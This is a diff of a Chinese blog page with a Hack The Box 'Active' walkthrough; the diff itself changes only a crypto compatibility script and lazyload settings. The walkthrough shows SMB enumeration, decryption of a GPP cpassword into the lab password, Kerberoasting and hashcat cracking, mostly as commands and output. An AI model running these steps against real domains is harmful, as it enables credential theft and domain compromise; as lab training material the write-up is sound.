@@ -9,7 +9,22 @@
     }
     </style>
 
-  
+  <script>
+    // 强制内网 IP 识别为安全上下文
+    if (window.location.hostname !== 'localhost' && window.location.protocol === 'http:') {
+        // 尝试手动映射 crypto 属性
+        if (!window.crypto.subtle && window.crypto.webkitSubtle) {
+            window.crypto.subtle = window.crypto.webkitSubtle;
+        }
+    }
+    
+    // 终极补丁：如果还是没有 subtle，则创建一个占位符避免报错
+    // 提示：这通常能解决加载报错，但如果插件强依赖原生加密，建议执行下面的“降级”预判
+    if (!window.isSecureContext) {
+        console.warn('当前环境非安全上下文，正在尝试兼容内网加密解密...');
+    }
+</script>
+
 
 <head>
   <meta charset="UTF-8">
@@ -61,7 +76,7 @@
 
   <script id="fluid-configs">
     var Fluid = window.Fluid || {};
-    var CONFIG = {"hostname":"192.168.126.129","root":"/","version":"1.8.7","typing":{"enable":false,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"onlypost":false},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
+    var CONFIG = {"hostname":"192.168.126.129","root":"/","version":"1.8.7","typing":{"enable":false,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":false,"onlypost":false},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
   </script>
   <script  src="/js/utils.js" ></script>
   <script  src="/js/color-schema.js" ></script>
@@ -235,33 +250,33 @@
 <p>搜索一下“Microsoft DNS 6.1.7601”，即可得知系统版本——Windows 2008 R2 Standard version</p>
 <h2 id="smb协议探测（Server-Message-Block-protocol）"><a href="#smb协议探测（Server-Message-Block-protocol）" class="headerlink" title="smb协议探测（Server Message Block protocol）"></a>smb协议探测（Server Message Block protocol）</h2><p>445端口是用来共享文件夹或者打印机的</p>
 <figure class="highlight nginx"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs nginx"><span class="hljs-attribute">nmap</span> --script safe -p445 <span class="hljs-number">10.10.10.100</span><br><br>smbclient -L //<span class="hljs-number">10.10.10.100</span><br><br>smbmap -H <span class="hljs-number">10.10.10.100</span><br></code></pre></div></td></tr></table></figure>
-<p><img src="/2019/01/15/24718/8.PNG" srcset="/img/loading.gif"></p>
+<p><img src="/2019/01/15/24718/8.PNG"></p>
 <p>smbclient &#x2F;&#x2F;10.10.10.100&#x2F;Replication<br>WARNING: The “syslog” option is deprecated<br>protocol negotiation failed: NT_STATUS_CONNECTION_RESET</p>
 <h2 id="smbmap"><a href="#smbmap" class="headerlink" title="smbmap"></a>smbmap</h2><p>SMBMap - Samba Share Enumerator</p>
 <p>用smbmap -h可以查看帮助文档</p>
-<p>-R是递归列出某目录<br><img src="/2019/01/15/24718/9.PNG" srcset="/img/loading.gif"></p>
+<p>-R是递归列出某目录<br><img src="/2019/01/15/24718/9.PNG"></p>
 <figure class="highlight brainfuck"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs brainfuck"><span class="hljs-comment">获得信息：</span><br><span class="hljs-comment">	</span><span class="hljs-string">.</span><span class="hljs-comment">\\active</span><span class="hljs-string">.</span><span class="hljs-comment">htb\Policies\&#123;31B2F340</span><span class="hljs-literal">-</span><span class="hljs-comment">016D</span><span class="hljs-literal">-</span><span class="hljs-comment">11D2</span><span class="hljs-literal">-</span><span class="hljs-comment">945F</span><span class="hljs-literal">-</span><span class="hljs-comment">00C04FB984F9&#125;\MACHINE\Preferences\Groups\</span><br><span class="hljs-comment">	dr</span><span class="hljs-literal">--</span><span class="hljs-comment">r</span><span class="hljs-literal">--</span><span class="hljs-comment">r</span><span class="hljs-literal">--</span>                <span class="hljs-comment">0 Sat Jul 21 18:37:44 2018	</span><span class="hljs-string">.</span><br><span class="hljs-comment">	dr</span><span class="hljs-literal">--</span><span class="hljs-comment">r</span><span class="hljs-literal">--</span><span class="hljs-comment">r</span><span class="hljs-literal">--</span>                <span class="hljs-comment">0 Sat Jul 21 18:37:44 2018	</span><span class="hljs-string">.</span><span class="hljs-string">.</span><br><span class="hljs-comment">	</span><span class="hljs-literal">-</span><span class="hljs-comment">r</span><span class="hljs-literal">--</span><span class="hljs-comment">r</span><span class="hljs-literal">--</span><span class="hljs-comment">r</span><span class="hljs-literal">--</span>              <span class="hljs-comment">533 Sat Jul 21 18:38:11 2018	Groups</span><span class="hljs-string">.</span><span class="hljs-comment">xml</span><br></code></pre></div></td></tr></table></figure>
 <p>下载文件: <code>smbmap -H 10.10.10.100 -R Replication -A Groups.xml</code></p>
 <figure class="highlight abnf"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs abnf">获得信息<span class="hljs-number">2</span>：<br><span class="hljs-attribute">cpassword</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ&quot;</span><br><span class="hljs-attribute">userName</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;active.htb\SVC_TGS&quot;</span><br></code></pre></div></td></tr></table></figure>
 <h2 id="破解cpassword"><a href="#破解cpassword" class="headerlink" title="破解cpassword"></a>破解cpassword</h2><p>参考资料：<a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=ks4aNbArOtk">Exploiting GPP - Credential Storage in Groups.xml File</a><br><a target="_blank" rel="noopener" href="https://github.com/reider-roque/pentest-tools/blob/master/password-cracking/gpprefdecrypt/gpprefdecrypt.ps1">工具下载<strong>gpprefdecrypt.ps1</strong></a></p>
 <figure class="highlight stylus"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs stylus">cmd<span class="hljs-selector-class">.exe</span> 右键以管理员身份运行<br>cd C:\Users\whale\Desktop<br>powershell<span class="hljs-selector-class">.exe</span> ./gpprefdecrypt<span class="hljs-selector-class">.ps1</span> edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ<br></code></pre></div></td></tr></table></figure>
-<p><img src="/2019/01/15/24718/10.PNG" srcset="/img/loading.gif"><br><code>GPPstillStandingStrong2k18</code></p>
+<p><img src="/2019/01/15/24718/10.PNG"><br><code>GPPstillStandingStrong2k18</code></p>
 <h4 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h4><p>期间出现windows不允许执行ps1脚本。<br>解决办法：以管理员身份运行powershell，输入以下命令，然后输入Y。</p>
 <figure class="highlight dsconfig"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs dsconfig"><span class="hljs-built_in">set-executionpolicy</span> <span class="hljs-string">remotesigned</span><br></code></pre></div></td></tr></table></figure>
 <h4 id="方法二："><a href="#方法二：" class="headerlink" title="方法二："></a>方法二：</h4><p>kali工具破解：</p>
 <figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">gpp-decrypt edBSHOwhZLTjt<span class="hljs-regexp">/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/</span>NglVmQ<br></code></pre></div></td></tr></table></figure>
-<h2 id="域用户提权"><a href="#域用户提权" class="headerlink" title="域用户提权"></a>域用户提权</h2><p><code>smbmap -d active.htb -u SVC_TGS -p GPPstillStandingStrong2k18 -H 10.10.10.100</code><br><img src="/2019/01/15/24718/11.PNG" srcset="/img/loading.gif"></p>
+<h2 id="域用户提权"><a href="#域用户提权" class="headerlink" title="域用户提权"></a>域用户提权</h2><p><code>smbmap -d active.htb -u SVC_TGS -p GPPstillStandingStrong2k18 -H 10.10.10.100</code><br><img src="/2019/01/15/24718/11.PNG"></p>
 <p>可以发现，多了三个目录可读。依次检查这些目录，获得了user.txt。<br><code>smbmap -d active.htb -u SVC_TGS -p GPPstillStandingStrong2k18 -H 10.10.10.100 -R Users -A user.txt</code></p>
 <p><strong>Kerberoasting</strong><br><a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/SecureAuthCorp/impacket/master/examples/GetUserSPNs.py">GetUserSPNs.py</a></p>
 <p>Kerberoasting是从票据分发服务中破解hash，来获得明文密码。</p>
 <p>Kerberos身份验证使用服务主体名称（SPN）来标识关联的帐户。</p>
 <figure class="highlight gradle"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs gradle">ldapsearch -x -h <span class="hljs-number">10.10</span>.<span class="hljs-number">10.100</span> -p <span class="hljs-number">389</span> -D <span class="hljs-string">&#x27;SVC_TGS&#x27;</span> -w <span class="hljs-string">&#x27;GPPstillStandingStrong2k18&#x27;</span> -b <span class="hljs-string">&quot;dc=active,dc=htb&quot;</span> -s sub <span class="hljs-string">&quot;(&amp;(objectCategory=person)(objectClass=user)(!(useraccountcontrol:1.2.840.113556.1.4.803:=2))(serviceprincipalname=*/*))&quot;</span> serviceprincipalname | <span class="hljs-keyword">grep</span> -B <span class="hljs-number">1</span> servicePrincipalName<br><br>locate GetUserSPNs.py<br><br><span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/doc/</span>python-impacket<span class="hljs-regexp">/examples/G</span>etUserSPNs.py -request -dc-ip <span class="hljs-number">10.10</span>.<span class="hljs-number">10.100</span> active.htb/SVC_TGS -save -outputfile GetUserSPNs.out<br><br></code></pre></div></td></tr></table></figure>
-<p><img src="/2019/01/15/24718/12.PNG" srcset="/img/loading.gif"></p>
+<p><img src="/2019/01/15/24718/12.PNG"></p>
 <figure class="highlight routeros"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs routeros">apt install exim4-config<br>apt-<span class="hljs-built_in">get</span> install pocl-opencl-icd<br>apt-<span class="hljs-built_in">get</span> install libhwloc-dev ocl-icd-dev ocl-icd-opencl-dev<br>apt-<span class="hljs-built_in">get</span><span class="hljs-built_in"> upgrade </span>hashcat 更新了一下hashcat，然后就可以正常运行了<br>hashcat -m 13100 GetUserSPNs.out /usr/share/wordlists/rockyou.txt --force --potfile-<span class="hljs-built_in">disable</span><br><br>john --format:krb5tgs GetUserSPNs.out <span class="hljs-attribute">--wordlist</span>=/usr/share/wordlists/rockyou.txt<br></code></pre></div></td></tr></table></figure>
-<p><img src="/2019/01/15/24718/13.PNG" srcset="/img/loading.gif"><br>如果字典里没有正确的密码，hashcat会提示</p>
+<p><img src="/2019/01/15/24718/13.PNG"><br>如果字典里没有正确的密码，hashcat会提示</p>
 <figure class="highlight inform7"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs inform7"><span class="hljs-comment">[s]</span>tatus <span class="hljs-comment">[p]</span>ause <span class="hljs-comment">[b]</span>ypass <span class="hljs-comment">[c]</span>heckpoint <span class="hljs-comment">[q]</span>uit =&gt; <br></code></pre></div></td></tr></table></figure>
 <p>这个时候就要换字典，再次尝试，或者放弃。</p>
-<p><img src="/2019/01/15/24718/14.PNG" srcset="/img/loading.gif"></p>
+<p><img src="/2019/01/15/24718/14.PNG"></p>
 <h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>工作组和域<br><a target="_blank" rel="noopener" href="https://www.douban.com/note/527276260/">工作组和域的区别</a></p>
 <p>域一般用在比较大的网络里，需要一台域控服务器，其他计算机要互相访问就要经过它。</p>
 <p>工作组比较小（网上邻居），没有控制彼此访问的服务器。</p>
@@ -400,10 +415,6 @@
 
 <!-- Plugins -->
 
-
-  
-    <script  src="/js/lazyload.js" ></script>
-  
 
 
 
